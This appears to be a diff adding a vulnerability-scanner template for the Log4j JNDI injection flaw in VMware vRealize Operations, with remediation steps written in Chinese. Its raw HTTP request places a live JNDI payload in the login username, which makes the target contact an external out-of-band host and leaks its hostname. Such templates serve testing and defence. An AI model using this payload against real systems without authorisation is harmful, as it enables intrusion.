@@ -1,0 +1,41 @@
+id: vrealize-operations-log4j-rce
+info:
+  name: VMware vRealize Operations Tenant App Log4j JNDI Remote Code Execution
+  author:
+  - bughuntersurya
+  description: |-
+    VMware vRealize Operations
+    VMware vRealize Operations是美国威睿（vmware）公司的一个应用程序。一个统一的，基于AI的平台上为私有，混合和多云环境提供自动驾驶的IT运营管理。
+    VMware vRealize Operations使用了带漏洞的log4j组件，导致存在log4j代码注入漏洞。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+
+    临时修复方案：
+    1、禁止使用log4j的服务器外连
+    2、添加 jvm 启动参数-Dlog4j2.formatMsgNoLookups=true
+    3、在应用 classpath 下添加 log4j2.component.properties 配置文件，文件内容为 log4j2.formatMsgNoLookups=true
+    4、将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
+    5、升级Java版本至JDK 11.0.1、8u191、7u201、6u211或更高版本
+requests:
+- matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - dns
+  - type: regex
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+  matchers-condition: and
+  raw:
+  - |
+    POST /suite-api/api/auth/token/acquire HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    Origin: {{RootURL}}
+    Referer: {{RootURL}}/ui/
+
+    {"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}
